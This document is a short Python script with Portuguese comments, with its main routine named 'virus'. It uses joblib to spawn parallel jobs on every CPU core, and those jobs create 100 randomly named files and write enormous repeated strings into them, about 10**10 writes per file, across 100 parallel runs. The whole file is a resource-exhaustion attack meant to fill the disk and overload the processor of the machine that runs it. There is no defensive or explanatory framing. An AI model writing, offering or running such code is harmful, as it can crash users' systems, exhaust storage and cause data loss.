import random
from joblib import Parallel, delayed

conteudo = 0 # item que vai ser escrito
quantidade = 100 # numero de arquivos a serem criados
multi = 100**100 # tamanho o item a ser escrito
multiplicativo = 10**10 # escritas simultâneas
escritas = 1 # vezes que cada item vai ser copiado no arquivo
item = 'a'


def escrever(arquivo,item):

    for l in range(escritas):
        arquivo.write(f'{str(item)*1000}')


def virus():

    global conteudo, l

    for i in range(quantidade):
        conteudo = int(random.random() * multi)
        with open(f'{conteudo}', 'a') as virus:
            item = str(conteudo)*10
            Parallel(n_jobs=-1)(delayed(escrever)(virus,item) for b in range(multiplicativo))
        print('Parallel')

Parallel(n_jobs=-1)(delayed(virus)() for a in range(quantidade))
